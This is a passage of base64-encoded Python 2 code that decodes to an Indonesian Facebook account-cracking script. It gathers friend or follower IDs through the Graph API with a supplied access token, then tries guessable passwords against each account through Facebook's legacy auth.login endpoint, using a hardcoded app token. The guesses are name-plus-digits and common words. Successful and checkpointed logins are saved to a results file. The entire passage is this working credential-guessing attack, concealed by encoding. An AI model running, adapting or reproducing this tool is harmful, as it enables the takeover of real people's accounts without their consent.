fX19fX19fX19fX19fX19fX19fX19fX18iCglwcmludCAiXDAzM1sxOzk3bSAxLikgQ3JhY2sgRGFyaSBEYWZ0YXIgVGVtYW4iCglwcmludCAiXDAzM1sxOzk3bSAyLikgQ3JhY2sgRGFyaSBQdWJsaWsiCglwcmludCAiXDAzM1sxOzk3bSAwLikgS2VtYmFsaSBcbiIKCXBpbGloX2luZG8oKQoKIyMjIyBQSUxJSCBJTkRPTkVTSUEgIyMjIwpkZWYgcGlsaWhfaW5kbygpOgoJdGVhayA9IHJhd19pbnB1dCgiXDAzM1sxOzk3bSBSeW5ubjopICIpCglwcmludCAiXDAzM1sxOzk3bSBfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18iCglpZiB0ZWFrID09IiI6CgkJcHJpbnQiXDAzM1sxOzk3bSBJc2kgU2luZyBCZW5lciBDb2sgISIKCQlwaWxpaF9pbmRvKCkKCWVsaWYgdGVhayA9PSIxIiBvciB0ZWFrID09IjAxIjoKCQlyID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRzP2FjY2Vzc190b2tlbj0iK3Rva2V0KQoJCXogPSBqc29uLmxvYWRzKHIudGV4dCkKCQlmb3IgcyBpbiB6WydkYXRhJ106CgkJCWlkLmFwcGVuZChzWydpZCddKQoJZWxpZiB0ZWFrID09IjIiIG9yIHRlYWsgPT0iMDIiOgoJICAgICAgICBpZHQgPSByYXdfaW5wdXQoIlwwMzNbMTs5N20gTWFzdWthbiBJRCBwdWJsaWsvdGVtYW4gOiAiKQoJCXRyeToKCQkJam9rID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkdCsiP2FjY2Vzc190b2tlbj0iK3Rva2V0KQoJCQlvcCA9IGpzb24ubG9hZHMoam9rLnRleHQpCgkJCXByaW50IlwwMzNbMTs5N20gTmFtYSA6ICIrb3BbIm5hbWUiXQoJCWV4Y2VwdCBLZXlFcnJvcjoKCQkJcHJpbnQiXDAzM1sxOzk3bSBJRCBUaWRhayBBZGEgISIKCQkJcmF3X2lucHV0KCJcbiBLZW1iYWxpICIpCgkJCWluZG8oKQoJCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKCQkJcHJpbnQiWyBPcmEgT25vIEludGVybmV0ICEiCgkJCWtlbHVhcigpCgkJciA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpZHQrIi9mcmllbmRzP2FjY2Vzc190b2tlbj0iK3Rva2V0KQoJCXogPSBqc29uLmxvYWRzKHIudGV4dCkKCQlmb3IgaSBpbiB6WydkYXRhJ106CgkJCWlkLmFwcGVuZChpWydpZCddKQoJZWxpZiB0ZWFrID09IjAiIG9yIHRlYWsgPT0iMDAiOgoJCW1lbnUoKQoJZWxzZToKCQlwcmludCJcMDMzWzE7OTdtIElzaSBTaW5nIEJlbmVyIENvayAhIgoJCXBpbGloX2luZG8oKQoJCglwcmludCAiXDAzM1sxOzk3bSBUb3RhbCBJRCA6ICIrc3RyKGxlbihpZCkpCgl0aXRpayA9IFsnLiAgICcsJy4uICAnLCcuLi4gJ10KCWZvciBvIGluIHRpdGlrOgoJCXByaW50KCJcclwwMzNbMTs5N20gT3R3IENyYWNrICIrbyksO3N5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDEpCgoJcHJpbnQgIlxuXDAzM1sxOzk3bSBfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18iCglwcmludCAiXDAzM1sxOzk3bSBQZW5jZXQgQ1RSTCtaIHVudHVrIGJlcmhlbnRpLCIKCXByaW50ICJcMDMzWzE7OTdtIE1vZGUgUGVzYXdhdCBqaWthIHRpZGFrIGFkYSBoYXNpbCIKCXByaW50ICJcMDMzWzE7OTdtIF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXyIKCQojIyMjIyBNQUlOIElORE9ORVNJQSAjIyMjIwoJZGVmIG1haW4oYXJnKToKCQlnbG9iYWwgY2VrcG9pbnQsb2tzCgkJdXNlciA9IGFyZwoJCXRyeToKCQkJb3MubWtkaXIoJ291dCcpCgkJZXhjZXB0IE9TRXJyb3I6CgkJCXBhc3MKCQl0cnk6CgkJCWEgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycrdXNlcisnLz9hY2Nlc3NfdG9rZW49Jyt0b2tldCkKCQkJYyA9IGpzb24ubG9hZHMoYS50ZXh0KQoJCQlwYXNzMSA9IGNbJ2ZpcnN0X25hbWUnXSsnMTIzJwoJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzMSkrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCXcgPSBqc29uLmxvYWQoZGF0YSkKCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gdzoKCQkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrdXNlcisiP2FjY2Vzc190b2tlbj0iK3dbJ2FjY2Vzc190b2tlbiddKQoJCQkJeiA9IGpzb24ubG9hZHMoeC50ZXh0KQoJCQkJcHJpbnQgJ1wwMzNbMTs5Mm0gLS0+ICcgKyB1c2VyICsgJ3wnICsgcGFzczEgKyAnfCcgKyBjWydiaXJ0aGRheSddCgkJCQlva3MuYXBwZW5kKHVzZXIrcGFzczEpCgkJCWVsc2U6CgkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gd1snZXJyb3JfbXNnJ106CgkJCQkJcHJpbnQgJ1wwMzNbMTs5M20gLS0+ICcgKyB1c2VyICsgJ3wnICsgcGFzczEgKyAnfCcgKyBjWydiaXJ0aGRheSddCgkJCQkJY2VrID0gb3Blbigib3V0L3N1cGVyX2NwLnR4dCIsICJhIikKCQkJCQljZWsud3JpdGUoIlxuSUQ6IiArdXNlcisgIiBQdzoiICtwYXNzMSsgIiBUVEw6IiArY1snYmlydGhkYXknXSkKCQkJCQljZWsuY2xvc2UoKQoJCQkJCWNla3BvaW50LmFwcGVuZCh1c2VyK3Bhc3MxKQoJCQkJZWxzZToKCQkJCQlwYXNzMiA9IGNbJ2ZpcnN0X25hbWUnXSsnMTIzNCcKCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzMikrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCQkJdyA9IGpzb24ubG9hZChkYXRhKQoJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHc6CgkJCQkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrdXNlcisiP2FjY2Vzc190b2tlbj0iK3dbJ2FjY2Vzc190b2tlbiddKQoJCQkJCQl6ID0ganNvbi5sb2Fkcyh4LnRleHQpCgkJCQkJCXByaW50ICdcMDMzWzE7OTJtIC0tPiAnICsgdXNlciArICd8JyArIHBhc3MyICsgJ3wnICsgY1snYmlydGhkYXknXQoJCQkJCQlva3MuYXBwZW5kKHVzZXIrcGFzczIpCgkJCQkJZWxzZToKCQkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHdbJ2Vycm9yX21zZyddOgoJCQkJCQkJcHJpbnQgJ1wwMzNbMTs5M20gLS0+ICcgKyB1c2VyICsgJ3wnICsgcGFzczIgKyAnfCcgKyBjWydiaXJ0aGRheSddCgkJCQkJCQljZWsgPSBvcGVuKCJvdXQvc3VwZXJfY3AudHh0IiwgImEiKQoJCQkJCQkJY2VrLndyaXRlKCJcbklEOiIgK3VzZXIrICIgUHc6IiArcGFzczIrICIgVFRMOiIgK2NbJ2JpcnRoZGF5J10pCgkJCQkJCQljZWsuY2xvc2UoKQoJCQkJCQkJY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczIpCgkJCQkJCWVsc2U6CgkJCQkJCQlwYXNzMyA9IGNbJ2ZpcnN0X25hbWUnXSsnMTIzNDUnCgkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzMykrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCQkJCQl3ID0ganNvbi5sb2FkKGRhdGEpCgkJCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiB3OgoJCQkJCQkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrdXNlcisiP2FjY2Vzc190b2tlbj0iK3dbJ2FjY2Vzc190b2tlbiddKQoJCQkJCQkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkKCQkJCQkJCQlwcmludCAnXDAzM1sxOzkybSAtLT4gJyArIHVzZXIgKyAnfCcgKyBwYXNzMyArICd8JyArIGNbJ2JpcnRoZGF5J10KCQkJCQkJCQlva3MuYXBwZW5kKHVzZXIrcGFzczMpCgkJCQkJCQllbHNlOgoJCQkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiB3WydlcnJvcl9tc2cnXToKCQkJCQkJCQkJcHJpbnQgJ1wwMzNbMTs5M20gLS0+ICcgKyB1c2VyICsgJ3wnICsgcGFzczMgKyAnfCcgKyBjWydiaXJ0aGRheSddCgkJCQkJCQkJCWNlayA9IG9wZW4oIm91dC9zdXBlcl9jcC50eHQiLCAiYSIpCgkJCQkJCQkJCWNlay53cml0ZSgiXG5JRDoiICt1c2VyKyAiIFB3OiIgK3Bhc3MzKyAiIFRUTDoiICtjWydiaXJ0aGRheSddKQoJCQkJCQkJCQljZWsuY2xvc2UoKQoJCQkJCQkJCQljZWtwb2ludC5hcHBlbmQodXNlcitwYXNzMykKCQkJCQkJCQllbHNlOgoJCQkJCQkJCQlwYXNzNCA9IGNbJ2xhc3RfbmFtZSddKycxMjMnCgkJCQkJCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKHVzZXIpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHBhc3M0KSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikKCQkJCQkJCQkJdyA9IGpzb24ubG9hZChkYXRhKQoJCQkJCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiB3OgoJCQkJCQkJCQkJeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIit1c2VyKyI/YWNjZXNzX3Rva2VuPSIrd1snYWNjZXNzX3Rva2VuJ10pCgkJCQkJCQkJCQl6ID0ganNvbi5sb2Fkcyh4LnRleHQpCgkJCQkJCQkJCQlwcmludCAnXDAzM1sxOzkybSAtLT4gJyArIHVzZXIgKyAnfCcgKyBwYXNzNCArICd8JyArIGNbJ2JpcnRoZGF5J10KCQkJCQkJCQkJCW9rcy5hcHBlbmQodXNlcitwYXNzNCkKCQkJCQkJCQkJZWxzZToKCQkJCQkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiB3WydlcnJvcl9tc2cnXToKCQkJCQkJCQkJCQlwcmludCAnXDAzM1sxOzkzbSAtLT4gJyArIHVzZXIgKyAnfCcgKyBwYXNzNCArICd8JyArIGNbJ2JpcnRoZGF5J10KCQkJCQkJCQkJCQljZWsgPSBvcGVuKCJvdXQvc3VwZXJfY3AudHh0IiwgImEiKQoJCQkJCQkJCQkJCWNlay53cml0ZSgiXG5JRDoiICt1c2VyKyAiIFB3OiIgK3Bhc3M0KyAiIFRUTDoiICtjWydiaXJ0aGRheSddKQoJCQkJCQkJCQkJCWNlay5jbG9zZSgpCgkJCQkJCQkJCQkJY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczQpCgkJCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkJCXBhc3M1ID0gY1snbGFzdF9uYW1lJ10rJzEyMzQnCgkJCQkJCQkJCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcikrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzczUpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQoJCQkJCQkJCQkJCXcgPSBqc29uLmxvYWQoZGF0YSkKCQkJCQkJCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiB3OgoJCQkJCQkJCQkJCQl4ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK3VzZXIrIj9hY2Nlc3NfdG9rZW49Iit3WydhY2Nlc3NfdG9rZW4nXSkKCQkJCQkJCQkJCQkJeiA9IGpzb24ubG9hZHMoeC50ZXh0KQoJCQkJCQkJCQkJCQlwcmludCAnXDAzM1sxOzkybSAtLT4gJyArIHVzZXIgKyAnfCcgKyBwYXNzNSArICd8JyArIGNbJ2JpcnRoZGF5J10KCQkJCQkJCQkJCQkJb2tzLmFwcGVuZCh1c2VyK3Bhc3M1KQoJCQkJCQkJCQkJCWVsc2U6CgkJCQkJCQkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiB3WydlcnJvcl9tc2cnXToKCQkJCQkJCQkJCQkJCXByaW50ICdcMDMzWzE7OTNtIC0tPiAnICsgdXNlciArICd8JyArIHBhc3M1ICsgJ3wnICsgY1snYmlydGhkYXknXQoJCQkJCQkJCQkJCQkJY2VrID0gb3Blbigib3V0L3N1cGVyX2NwLnR4dCIsICJhIikKCQkJCQkJCQkJCQkJCWNlay53cml0ZSgiXG5JRDoiICt1c2VyKyAiIFB3OiIgK3Bhc3M1KyAiIFRUTDoiICtjWydiaXJ0aGRheSddKQoJCQkJCQkJCQkJCQkJY2VrLmNsb3NlKCkKCQkJCQkJCQkJCQkJCWNla3BvaW50LmFwcGVuZCh1c2VyK3Bhc3M1KQoJCQkJCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkJCQkJcGFzczYgPSBjWydsYXN0X25hbWUnXSsnMTIzNDUnCgkJCQkJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzNikrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCQkJCQkJCQkJCQl3ID0ganNvbi5sb2FkKGRhdGEpCgkJCQkJCQkJCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiB3OgoJCQkJCQkJCQkJCQkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrdXNlcisiP2FjY2Vzc190b2tlbj0iK3dbJ2FjY2Vzc190b2tlbiddKQoJCQkJCQkJCQkJCQkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkKCQkJCQkJCQkJCQkJCQlwcmludCAnXDAzM1sxOzkybSAtLT4gJyArIHVzZXIgKyAnfCcgKyBwYXNzNiArICd8JyArIGNbJ2JpcnRoZGF5J10KCQkJCQkJCQkJCQkJCQlva3MuYXBwZW5kKHVzZXIrcGFzczYpCgkJCQkJCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiB3WydlcnJvcl9tc2cnXToKCQkJCQkJCQkJCQkJCQkJcHJpbnQgJ1wwMzNbMTs5M20gLS0+ICcgKyB1c2VyICsgJ3wnICsgcGFzczYgKyAnfCcgKyBjWydiaXJ0aGRheSddCgkJCQkJCQkJCQkJCQkJCWNlayA9IG9wZW4oIm91dC9zdXBlcl9jcC50eHQiLCAiYSIpCgkJCQkJCQkJCQkJCQkJCWNlay53cml0ZSgiXG5JRDoiICt1c2VyKyAiIFB3OiIgK3Bhc3M2KyAiIFRUTDoiICtjWydiaXJ0aGRheSddKQoJCQkJCQkJCQkJCQkJCQljZWsuY2xvc2UoKQoJCQkJCQkJCQkJCQkJCQljZWtwb2ludC5hcHBlbmQodXNlcitwYXNzNikKCQkJCQkJCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkJCQkJCQlwYXNzNyA9ICdTYXlhbmcnCgkJCQkJCQkJCQkJCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKHVzZXIpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHBhc3M3KSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikKCQkJCQkJCQkJCQkJCQkJdyA9IGpzb24ubG9hZChkYXRhKQoJCQkJCQkJCQkJCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiB3OgoJCQkJCQkJCQkJCQkJCQkJeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIit1c2VyKyI/YWNjZXNzX3Rva2VuPSIrd1snYWNjZXNzX3Rva2VuJ10pCgkJCQkJCQkJCQkJCQkJCQl6ID0ganNvbi5sb2Fkcyh4LnRleHQpCgkJCQkJCQkJCQkJCQkJCQlwcmludCAnXDAzM1sxOzkybSAtLT4gJyArIHVzZXIgKyAnfCcgKyBwYXNzNyArICd8JyArIGNbJ2JpcnRoZGF5J10KCQkJCQkJCQkJCQkJCQkJCW9rcy5hcHBlbmQodXNlcitwYXNzNykKCQkJCQkJCQkJCQkJCQkJZWxzZToKCQkJCQkJCQkJCQkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiB3WydlcnJvcl9tc2cnXToKCQkJCQkJCQkJCQkJCQkJCQlwcmludCAnXDAzM1sxOzkzbSAtLT4gJyArIHVzZXIgKyAnfCcgKyBwYXNzNyArICd8JyArIGNbJ2JpcnRoZGF5J10KCQkJCQkJCQkJCQkJCQkJCQljZWsgPSBvcGVuKCJvdXQvc3VwZXJfY3AudHh0IiwgImEiKQoJCQkJCQkJCQkJCQkJCQkJCWNlay53cml0ZSgiXG5JRDoiICt1c2VyKyAiIFB3OiIgK3Bhc3M3KyAiIFRUTDoiICtjWydiaXJ0aGRheSddKQoJCQkJCQkJCQkJCQkJCQkJCWNlay5jbG9zZSgpCgkJCQkJCQkJCQkJCQkJCQkJY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczcpCgkJCQkJCQkJCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkJCQkJCQkJCXBhc3M4ID0gJ2tvbnRvbCcKCQkJCQkJCQkJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzOCkrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCQkJCQkJCQkJCQkJCQkJdyA9IGpzb24ubG9hZChkYXRhKQoJCQkJCQkJCQkJCQkJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHc6CgkJCQkJCQkJCQkJCQkJCQkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrdXNlcisiP2FjY2Vzc190b2tlbj0iK3dbJ2FjY2Vzc190b2tlbiddKQoJCQkJCQkJCQkJCQkJCQkJCQl6ID0ganNvbi5sb2Fkcyh4LnRleHQpCgkJCQkJCQkJCQkJCQkJCQkJCXByaW50ICdcMDMzWzE7OTJtIC0tPiAnICsgdXNlciArICd8JyArIHBhc3M4ICsgJ3wnICsgY1snYmlydGhkYXknXQoJCQkJCQkJCQkJCQkJCQkJCQlva3MuYXBwZW5kKHVzZXIrcGFzczgpCgkJCQkJCQkJCQkJCQkJCQkJZWxzZToKCQkJCQkJCQkJCQkJCQkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHdbJ2Vycm9yX21zZyddOgoJCQkJCQkJCQkJCQkJCQkJCQkJcHJpbnQgJ1wwMzNbMTs5M20gLS0+ICcgKyB1c2VyICsgJ3wnICsgcGFzczggKyAnfCcgKyBjWydiaXJ0aGRheSddCgkJCQkJCQkJCQkJCQkJCQkJCQljZWsgPSBvcGVuKCJvdXQvc3VwZXJfY3AudHh0IiwgImEiKQoJCQkJCQkJCQkJCQkJCQkJCQkJY2VrLndyaXRlKCJcbklEOiIgK3VzZXIrICIgUHc6IiArcGFzczgrICIgVFRMOiIgK2NbJ2JpcnRoZGF5J10pCgkJCQkJCQkJCQkJCQkJCQkJCQljZWsuY2xvc2UoKQoJCQkJCQkJCQkJCQkJCQkJCQkJY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczgpCgkJCQkJCQkJCQkJCQkJCQkJCWVsc2U6CgkJCQkJCQkJCQkJCQkJCQkJCQkJcGFzczkgPSAnYW5qaW5nJwoJCQkJCQkJCQkJCQkJCQkJCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKHVzZXIpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHBhc3M5KSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikKCQkJCQkJCQkJCQkJCQkJCQkJCQl3ID0ganNvbi5sb2FkKGRhdGEpCgkJCQkJCQkJCQkJCQkJCQkJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gdzoKCQkJCQkJCQkJCQkJCQkJCQkJCQkJeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIit1c2VyKyI/YWNjZXNzX3Rva2VuPSIrd1snYWNjZXNzX3Rva2VuJ10pCgkJCQkJCQkJCQkJCQkJCQkJCQkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkKCQkJCQkJCQkJCQkJCQkJCQkJCQkJcHJpbnQgJ1wwMzNbMTs5Mm0gLS0+ICcgKyB1c2VyICsgJ3wnICsgcGFzczkgKyAnfCcgKyBjWydiaXJ0aGRheSddCgkJCQkJCQkJCQkJCQkJCQkJCQkJCW9rcy5hcHBlbmQodXNlcitwYXNzOSkKCQkJCQkJCQkJCQkJCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkJCQkJCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gd1snZXJyb3JfbXNnJ106CgkJCQkJCQkJCQkJCQkJCQkJCQkJCQlwcmludCAnXDAzM1sxOzkzbSAtLT4gJyArIHVzZXIgKyAnfCcgKyBwYXNzOSArICd8JyArIGNbJ2JpcnRoZGF5J10KCQkJCQkJCQkJCQkJCQkJCQkJCQkJCWNlayA9IG9wZW4oIm91dC9zdXBlcl9jcC50eHQiLCAiYSIpCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQljZWsud3JpdGUoIlxuSUQ6IiArdXNlcisgIiBQdzoiICtwYXNzOSsgIiBUVEw6IiArY1snYmlydGhkYXknXSkKCQkJCQkJCQkJCQkJCQkJCQkJCQkJCWNlay5jbG9zZSgpCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQljZWtwb2ludC5hcHBlbmQodXNlcitwYXNzOSkKCQkJCQkJCQkJCQkJCQkJCQkJCQkJZWxzZToKCQkJCQkJCQkJCQkJCQkJCQkJIAkJCQlwYXNzMTAgPSAnQmFuZ3NhdCcKCQkJCQkJCQkJCQkJCQkJCQkJCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKHVzZXIpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHBhc3MxMCkrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQl3ID0ganNvbi5sb2FkKGRhdGEpCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiB3OgoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrdXNlcisiP2FjY2Vzc190b2tlbj0iK3dbJ2FjY2Vzc190b2tlbiddKQoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkKCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQlwcmludCAnXDAzM1sxOzkybSAtLT4gJyArIHVzZXIgKyAnfCcgKyBwYXNzMTAgKyAnfCcgKyBjWydiaXJ0aGRheSddCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJb2tzLmFwcGVuZCh1c2VyK3Bhc3MxMCkKCQkJC